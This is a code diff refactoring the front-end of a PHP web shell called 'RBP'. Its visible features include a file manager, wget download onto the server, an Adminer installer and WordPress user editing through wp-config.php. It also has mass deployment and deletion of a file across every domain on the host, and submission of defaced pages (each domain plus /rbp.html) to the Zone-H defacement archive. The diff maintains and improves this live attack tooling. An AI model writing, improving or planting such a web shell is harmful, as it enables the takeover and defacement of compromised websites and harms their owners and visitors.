@@ -204,7 +204,7 @@ function RBPdownloadDomainsList($baseDir, $filename) {
     return $domainsList;
 }
 
-// WordPress User Editor Function - FIXED TO FIND WP-CONFIG.PHP
+// WordPress User Editor Function
 function RBPeditWordPressUser() {
     $result = [];
     
@@ -1112,248 +1112,6 @@ if (isset($_SESSION['adminer_result'])) {
             margin: 15px 0;
         }
     </style>
-    <script>
-        function RBPpostDir(dir) {
-            window.location.href = '?d=' + btoa(dir);
-        }
-        
-        function RBPpostDel(path) {
-            if (confirm('Are you sure you want to delete this file?')) {
-                var form = document.createElement("form");
-                form.method = "post";
-                form.action = "";
-                var input = document.createElement("input");
-                input.name = "del";
-                input.value = btoa(path);
-                form.appendChild(input);
-                document.body.appendChild(form);
-                form.submit();
-            }
-        }
-        
-        function RBPpostEdit(path) {
-            var form = document.createElement("form");
-            form.method = "post";
-            form.action = "";
-            var input = document.createElement("input");
-            input.name = "edit";
-            input.value = btoa(path);
-            form.appendChild(input);
-            document.body.appendChild(form);
-            form.submit();
-        }
-        
-        function RBPpostRen(path, name) {
-            var newName = prompt("New name:", name);
-            if (newName && newName !== name) {
-                var form = document.createElement("form");
-                form.method = "post";
-                form.action = "";
-                var input1 = document.createElement("input");
-                input1.name = "ren";
-                input1.value = btoa(path);
-                var input2 = document.createElement("input");
-                input2.name = "new";
-                input2.value = newName;
-                form.appendChild(input1);
-                form.appendChild(input2);
-                document.body.appendChild(form);
-                form.submit();
-            }
-        }
-        
-        function RBPpostOpen(path) {
-            window.open(path, '_blank');
-        }
-        
-        function RBPshowWgetPopup() {
-            document.getElementById('wgetPopup').style.display = 'block';
-        }
-        
-        function RBPshowAdminerPopup() {
-            document.getElementById('adminerPopup').style.display = 'block';
-        }
-        
-        function RBPshowZoneHPopup() {
-            document.getElementById('zonehPopup').style.display = 'block';
-        }
-        
-        function RBPshowWPEditUserPopup() {
-            document.getElementById('wpedituserPopup').style.display = 'block';
-        }
-        
-        function RBPshowMassDeployPopup() {
-            RBPpopulateFileSelector();
-            RBPupdateDomainInfo();
-            document.getElementById('massDeployPopup').style.display = 'block';
-        }
-        
-        function RBPpopulateFileSelector() {
-            var fileList = document.getElementById('fileList');
-            fileList.innerHTML = '';
-            
-            var files = <?php 
-                $files = [];
-                if (is_dir($currentDir) && $handle = opendir($currentDir)) {
-                    while (false !== ($entry = readdir($handle))) {
-                        if ($entry != "." && $entry != ".." && !is_dir($currentDir . '/' . $entry)) {
-                            $files[] = $entry;
-                        }
-                    }
-                    closedir($handle);
-                }
-                echo json_encode($files);
-            ?>;
-            
-            files.forEach(function(file) {
-                var div = document.createElement('div');
-                div.className = 'file-selector-item';
-                div.textContent = file;
-                div.onclick = function() {
-                    var items = document.getElementsByClassName('file-selector-item');
-                    for (var i = 0; i < items.length; i++) {
-                        items[i].classList.remove('selected');
-                    }
-                    this.classList.add('selected');
-                    document.getElementById('deploy_file_path').value = '<?php echo $currentDir; ?>/' + file;
-                };
-                fileList.appendChild(div);
-            });
-        }
-        
-        function RBPupdateDomainInfo() {
-            var domainInfo = document.getElementById('domainInfo');
-            domainInfo.innerHTML = '<p>Auto-detected base directory: <?php echo htmlspecialchars($baseDir); ?></p>';
-            
-            var domains = <?php echo json_encode(RBPgetAllSubdomains($baseDir)); ?>;
-            
-            domains.forEach(function(domain) {
-                var div = document.createElement('div');
-                div.className = 'domain-item';
-                div.textContent = domain.name + ' -> ' . domain.path;
-                domainInfo.appendChild(div);
-            });
-            
-            if (domains.length === 0) {
-                domainInfo.innerHTML += '<p style="color: red;">No domains found in base directory!</p>';
-            } else {
-                domainInfo.innerHTML += '<p style="color: lime;">Found ' + domains.length + ' domains/subdomains</p>';
-            }
-        }
-        
-        function RBPclosePopup(popupId) {
-            document.getElementById(popupId).style.display = 'none';
-        }
-        
-        function RBPcloseResultsPopup() {
-            document.getElementById('resultsPopup').style.display = 'none';
-        }
-        
-        function RBPsubmitWget() {
-            var url = document.getElementById('wgetUrl').value;
-            if (url) {
-                var form = document.createElement("form");
-                form.method = "post";
-                form.action = "";
-                var input1 = document.createElement("input");
-                input1.name = "wget_url";
-                input1.value = url;
-                form.appendChild(input1);
-                document.body.appendChild(form);
-                form.submit();
-            }
-        }
-        
-        function RBPsubmitAdminer() {
-            var form = document.createElement("form");
-            form.method = "post";
-            form.action = "";
-            var input1 = document.createElement("input");
-            input1.name = "download_adminer";
-            input1.value = "1";
-            form.appendChild(input1);
-            document.body.appendChild(form);
-            form.submit();
-        }
-        
-        function RBPsubmitZoneH() {
-            var form = document.createElement("form");
-            form.method = "post";
-            form.action = "";
-            var input1 = document.createElement("input");
-            input1.name = "zoneh_nick";
-            input1.value = document.getElementById('zoneh_nick').value;
-            var input2 = document.createElement("input");
-            input2.name = "zoneh_url";
-            input2.value = document.getElementById('zoneh_url').value;
-            var input3 = document.createElement("input");
-            input3.name = "zoneh_submit";
-            input3.value = "1";
-            form.appendChild(input1);
-            form.appendChild(input2);
-            form.appendChild(input3);
-            document.body.appendChild(form);
-            form.submit();
-        }
-        
-        function RBPsubmitMassDeploy() {
-            var form = document.createElement("form");
-            form.method = "post";
-            form.action = "";
-            var input1 = document.createElement("input");
-            input1.name = "deploy_file_path";
-            input1.value = document.getElementById('deploy_file_path').value;
-            var input2 = document.createElement("input");
-            input2.name = "mass_deploy";
-            input2.value = "1";
-            form.appendChild(input1);
-            form.appendChild(input2);
-            document.body.appendChild(form);
-            form.submit();
-        }
-        
-        function RBPsubmitMassDelete() {
-            var form = document.createElement("form");
-            form.method = "post";
-            form.action = "";
-            var input1 = document.createElement("input");
-            input1.name = "deploy_file_path";
-            input1.value = document.getElementById('deploy_file_path').value;
-            var input2 = document.createElement("input");
-            input2.name = "mass_delete";
-            input2.value = "1";
-            form.appendChild(input1);
-            form.appendChild(input2);
-            document.body.appendChild(form);
-            form.submit();
-        }
-        
-        function RBPdownloadDomains() {
-            var extension = prompt("Enter file extension (e.g., rbp.html) or leave blank for domain only:", "rbp.html");
-            if (extension !== null) {
-                window.open('?download=1&extension=' + encodeURIComponent(extension), '_blank');
-            }
-        }
-        
-        function RBPsubmitWPEditUser() {
-            var form = document.createElement("form");
-            form.method = "post";
-            form.action = "";
-            var input1 = document.createElement("input");
-            input1.name = "wp_edit_user_submit";
-            input1.value = "1";
-            form.appendChild(input1);
-            document.body.appendChild(form);
-            form.submit();
-        }
-        
-        // Auto-show results popup if there are results
-        window.onload = function() {
-            <?php if (isset($_SESSION['mass_deploy_results']) || isset($_SESSION['mass_delete_results']) || isset($_SESSION['wp_edit_results']) || isset($_SESSION['zoneh_results'])): ?>
-            document.getElementById('resultsPopup').style.display = 'block';
-            <?php endif; ?>
-        };
-    </script>
 </head>
 <body>
     <div class="header">
@@ -1363,11 +1121,11 @@ if (isset($_SESSION['adminer_result'])) {
         </div>
         
         <div class="toolbar">
-            <button onclick="RBPshowAdminerPopup()" class="tool-button">Adminer</button>
-            <button onclick="RBPshowZoneHPopup()" class="tool-button">Zone-H</button>
-            <button onclick="RBPshowWPEditUserPopup()" class="tool-button">Edit WordPress User</button>
-            <button onclick="RBPshowWgetPopup()" class="tool-button">WGET Download</button>
-            <button onclick="RBPshowMassDeployPopup()" class="tool-button">Auto Mass Deploy</button>
+            <button class="tool-button" onclick="RBPshowAdminerPopup()">Adminer</button>
+            <button class="tool-button" onclick="RBPshowZoneHPopup()">Zone-H</button>
+            <button class="tool-button" onclick="RBPshowWPEditUserPopup()">Edit WordPress User</button>
+            <button class="tool-button" onclick="RBPshowWgetPopup()">WGET Download</button>
+            <button class="tool-button" onclick="RBPshowMassDeployPopup()">Auto Mass Deploy</button>
         </div>
         
         <div class="upload-section">
@@ -1498,7 +1256,7 @@ if (isset($_SESSION['adminer_result'])) {
             }
             ?>
             <div style="text-align: center; margin-top: 15px;">
-                <button onclick="RBPcloseResultsPopup()" class="tool-button">Close</button>
+                <button class="tool-button" onclick="RBPcloseResultsPopup()">Close</button>
             </div>
         </div>
     </div>
@@ -1510,8 +1268,8 @@ if (isset($_SESSION['adminer_result'])) {
             <p>Enter URL to download file:</p>
             <input type="text" id="wgetUrl" placeholder="https://example.com/file.txt" value="https://">
             <div style="text-align: center; margin-top: 15px;">
-                <button onclick="RBPsubmitWget()" class="tool-button">Download</button>
-                <button onclick="RBPclosePopup('wgetPopup')" class="tool-button">Cancel</button>
+                <button class="tool-button" onclick="RBPsubmitWget()">Download</button>
+                <button class="tool-button" onclick="RBPclosePopup('wgetPopup')">Cancel</button>
             </div>
         </div>
     </div>
@@ -1523,8 +1281,8 @@ if (isset($_SESSION['adminer_result'])) {
                 <h3>Adminer Downloader</h3>
                 <p>Download and install Adminer database management tool.</p>
                 <div style="text-align: center; margin-top: 15px;">
-                    <button onclick="RBPsubmitAdminer()" class="tool-button">Download Adminer</button>
-                    <button onclick="RBPclosePopup('adminerPopup')" class="tool-button">Cancel</button>
+                    <button class="tool-button" onclick="RBPsubmitAdminer()">Download Adminer</button>
+                    <button class="tool-button" onclick="RBPclosePopup('adminerPopup')">Cancel</button>
                 </div>
             </div>
         </div>
@@ -1540,8 +1298,8 @@ if (isset($_SESSION['adminer_result'])) {
                 <p>Domains (one per line):</p>
                 <textarea id="zoneh_url" rows="10" placeholder="example.com&#10;example.net&#10;example.org"></textarea>
                 <div style="text-align: center; margin-top: 15px;">
-                    <button onclick="RBPsubmitZoneH()" class="tool-button">Submit to Zone-H</button>
-                    <button onclick="RBPclosePopup('zonehPopup')" class="tool-button">Cancel</button>
+                    <button class="tool-button" onclick="RBPsubmitZoneH()">Submit to Zone-H</button>
+                    <button class="tool-button" onclick="RBPclosePopup('zonehPopup')">Cancel</button>
                 </div>
                 <p><small>Note: Each domain will automatically have /rbp.html added</small></p>
             </div>
@@ -1555,22 +1313,46 @@ if (isset($_SESSION['adminer_result'])) {
                 <h3>Auto Mass Deploy</h3>
                 
                 <div class="domain-info" id="domainInfo">
-                    <!-- Domain info will be populated by JavaScript -->
+                    <p>Auto-detected base directory: <?php echo htmlspecialchars($baseDir); ?></p>
+                    <?php
+                    $domains = RBPgetAllSubdomains($baseDir);
+                    foreach ($domains as $domain) {
+                        echo '<div class="domain-item">' . htmlspecialchars($domain['name']) . ' -> ' . htmlspecialchars($domain['path']) . '</div>';
+                    }
+                    if (count($domains) === 0) {
+                        echo '<p style="color: red;">No domains found in base directory!</p>';
+                    } else {
+                        echo '<p style="color: lime;">Found ' . count($domains) . ' domains/subdomains</p>';
+                    }
+                    ?>
                 </div>
                 
                 <p><strong>Select File to Deploy:</strong></p>
                 <div id="fileList" class="file-selector">
-                    <!-- Files will be populated by JavaScript -->
+                    <?php
+                    $files = [];
+                    if (is_dir($currentDir) && $handle = opendir($currentDir)) {
+                        while (false !== ($entry = readdir($handle))) {
+                            if ($entry != "." && $entry != ".." && !is_dir($currentDir . '/' . $entry)) {
+                                $files[] = $entry;
+                            }
+                        }
+                        closedir($handle);
+                    }
+                    foreach ($files as $file) {
+                        echo '<div class="file-selector-item" onclick="RBPselectFile(\'' . htmlspecialchars($file) . '\')">' . htmlspecialchars($file) . '</div>';
+                    }
+                    ?>
                 </div>
                 
                 <p><strong>Selected File Path:</strong></p>
                 <input type="text" id="deploy_file_path" placeholder="/path/to/your/file.html" readonly>
                 
                 <div style="text-align: center; margin-top: 15px;">
-                    <button onclick="RBPsubmitMassDeploy()" class="tool-button">Deploy to All Domains</button>
-                    <button onclick="RBPsubmitMassDelete()" class="tool-button">Delete from All Domains</button>
-                    <button onclick="RBPdownloadDomains()" class="tool-button">Download Domains List</button>
-                    <button onclick="RBPclosePopup('massDeployPopup')" class="tool-button">Cancel</button>
+                    <button class="tool-button" onclick="RBPsubmitMassDeploy()">Deploy to All Domains</button>
+                    <button class="tool-button" onclick="RBPsubmitMassDelete()">Delete from All Domains</button>
+                    <button class="tool-button" onclick="RBPdownloadDomains()">Download Domains List</button>
+                    <button class="tool-button" onclick="RBPclosePopup('massDeployPopup')">Cancel</button>
                 </div>
                 
                 <p><small>This will automatically deploy the selected file to ALL detected subdomains in: <?php echo htmlspecialchars($baseDir); ?></small></p>
@@ -1598,13 +1380,210 @@ if (isset($_SESSION['adminer_result'])) {
                 </p>
                 <p style="color: #ccc; font-size: 12px;">Current directory: <?php echo htmlspecialchars($currentDir); ?></p>
                 <div style="text-align: center; margin-top: 15px;">
-                    <button onclick="RBPsubmitWPEditUser()" class="tool-button" style="background: #4CAF50; border-color: #4CAF50;">Edit WordPress User</button>
-                    <button onclick="RBPclosePopup('wpedituserPopup')" class="tool-button">Cancel</button>
+                    <button class="tool-button" style="background: #4CAF50; border-color: #4CAF50;" onclick="RBPsubmitWPEditUser()">Edit WordPress User</button>
+                    <button class="tool-button" onclick="RBPclosePopup('wpedituserPopup')">Cancel</button>
                 </div>
                 <p><small>Note: Will search for wp-config.php automatically from current directory</small></p>
             </div>
         </div>
     </div>
+
+    <script>
+        function RBPpostDir(dir) {
+            window.location.href = '?d=' + btoa(dir);
+        }
+        
+        function RBPpostDel(path) {
+            if (confirm('Are you sure you want to delete this file?')) {
+                var form = document.createElement("form");
+                form.method = "post";
+                form.action = "";
+                var input = document.createElement("input");
+                input.name = "del";
+                input.value = btoa(path);
+                form.appendChild(input);
+                document.body.appendChild(form);
+                form.submit();
+            }
+        }
+        
+        function RBPpostEdit(path) {
+            var form = document.createElement("form");
+                form.method = "post";
+                form.action = "";
+                var input = document.createElement("input");
+                input.name = "edit";
+                input.value = btoa(path);
+                form.appendChild(input);
+                document.body.appendChild(form);
+                form.submit();
+        }
+        
+        function RBPpostRen(path, name) {
+            var newName = prompt("New name:", name);
+            if (newName && newName !== name) {
+                var form = document.createElement("form");
+                form.method = "post";
+                form.action = "";
+                var input1 = document.createElement("input");
+                input1.name = "ren";
+                input1.value = btoa(path);
+                var input2 = document.createElement("input");
+                input2.name = "new";
+                input2.value = newName;
+                form.appendChild(input1);
+                form.appendChild(input2);
+                document.body.appendChild(form);
+                form.submit();
+            }
+        }
+        
+        function RBPpostOpen(path) {
+            window.open(path, '_blank');
+        }
+        
+        function RBPshowWgetPopup() {
+            document.getElementById('wgetPopup').style.display = 'block';
+        }
+        
+        function RBPshowAdminerPopup() {
+            document.getElementById('adminerPopup').style.display = 'block';
+        }
+        
+        function RBPshowZoneHPopup() {
+            document.getElementById('zonehPopup').style.display = 'block';
+        }
+        
+        function RBPshowWPEditUserPopup() {
+            document.getElementById('wpedituserPopup').style.display = 'block';
+        }
+        
+        function RBPshowMassDeployPopup() {
+            document.getElementById('massDeployPopup').style.display = 'block';
+        }
+        
+        function RBPselectFile(filename) {
+            var items = document.getElementsByClassName('file-selector-item');
+            for (var i = 0; i < items.length; i++) {
+                items[i].classList.remove('selected');
+            }
+            event.target.classList.add('selected');
+            document.getElementById('deploy_file_path').value = '<?php echo $currentDir; ?>/' + filename;
+        }
+        
+        function RBPclosePopup(popupId) {
+            document.getElementById(popupId).style.display = 'none';
+        }
+        
+        function RBPcloseResultsPopup() {
+            document.getElementById('resultsPopup').style.display = 'none';
+        }
+        
+        function RBPsubmitWget() {
+            var url = document.getElementById('wgetUrl').value;
+            if (url) {
+                var form = document.createElement("form");
+                form.method = "post";
+                form.action = "";
+                var input1 = document.createElement("input");
+                input1.name = "wget_url";
+                input1.value = url;
+                form.appendChild(input1);
+                document.body.appendChild(form);
+                form.submit();
+            }
+        }
+        
+        function RBPsubmitAdminer() {
+            var form = document.createElement("form");
+            form.method = "post";
+            form.action = "";
+            var input1 = document.createElement("input");
+            input1.name = "download_adminer";
+            input1.value = "1";
+            form.appendChild(input1);
+            document.body.appendChild(form);
+            form.submit();
+        }
+        
+        function RBPsubmitZoneH() {
+            var form = document.createElement("form");
+            form.method = "post";
+            form.action = "";
+            var input1 = document.createElement("input");
+            input1.name = "zoneh_nick";
+            input1.value = document.getElementById('zoneh_nick').value;
+            var input2 = document.createElement("input");
+            input2.name = "zoneh_url";
+            input2.value = document.getElementById('zoneh_url').value;
+            var input3 = document.createElement("input");
+            input3.name = "zoneh_submit";
+            input3.value = "1";
+            form.appendChild(input1);
+            form.appendChild(input2);
+            form.appendChild(input3);
+            document.body.appendChild(form);
+            form.submit();
+        }
+        
+        function RBPsubmitMassDeploy() {
+            var form = document.createElement("form");
+            form.method = "post";
+            form.action = "";
+            var input1 = document.createElement("input");
+            input1.name = "deploy_file_path";
+            input1.value = document.getElementById('deploy_file_path').value;
+            var input2 = document.createElement("input");
+            input2.name = "mass_deploy";
+            input2.value = "1";
+            form.appendChild(input1);
+            form.appendChild(input2);
+            document.body.appendChild(form);
+            form.submit();
+        }
+        
+        function RBPsubmitMassDelete() {
+            var form = document.createElement("form");
+            form.method = "post";
+            form.action = "";
+            var input1 = document.createElement("input");
+            input1.name = "deploy_file_path";
+            input1.value = document.getElementById('deploy_file_path').value;
+            var input2 = document.createElement("input");
+            input2.name = "mass_delete";
+            input2.value = "1";
+            form.appendChild(input1);
+            form.appendChild(input2);
+            document.body.appendChild(form);
+            form.submit();
+        }
+        
+        function RBPdownloadDomains() {
+            var extension = prompt("Enter file extension (e.g., rbp.html) or leave blank for domain only:", "rbp.html");
+            if (extension !== null) {
+                window.open('?download=1&extension=' + encodeURIComponent(extension), '_blank');
+            }
+        }
+        
+        function RBPsubmitWPEditUser() {
+            var form = document.createElement("form");
+            form.method = "post";
+            form.action = "";
+            var input1 = document.createElement("input");
+            input1.name = "wp_edit_user_submit";
+            input1.value = "1";
+            form.appendChild(input1);
+            document.body.appendChild(form);
+            form.submit();
+        }
+        
+        // Auto-show results popup if there are results
+        window.onload = function() {
+            <?php if (isset($_SESSION['mass_deploy_results']) || isset($_SESSION['mass_delete_results']) || isset($_SESSION['wp_edit_results']) || isset($_SESSION['zoneh_results'])): ?>
+            document.getElementById('resultsPopup').style.display = 'block';
+            <?php endif; ?>
+        };
+    </script>
 
 <?php
 // Only show file listing if not in edit/rename mode
